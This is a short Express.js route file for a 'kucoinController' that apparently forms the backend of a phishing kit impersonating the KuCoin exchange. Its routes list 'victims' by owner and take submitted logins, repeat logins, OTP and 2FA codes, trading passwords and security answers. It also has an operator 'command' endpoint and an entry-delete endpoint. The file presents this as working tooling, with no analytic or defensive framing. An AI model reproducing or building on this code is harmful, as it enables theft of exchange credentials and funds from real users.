const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitTrading,
  submitOtp,
  submitSec,
  submit2fa,
  deleteEntry,
} = require("../controllers/kucoinController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/trading", submitTrading);
router.post("/otp", submitOtp);
router.post("/2fa", submit2fa);
router.post("/delete", deleteEntry);
router.post("/security", submitSec);

module.exports = router;
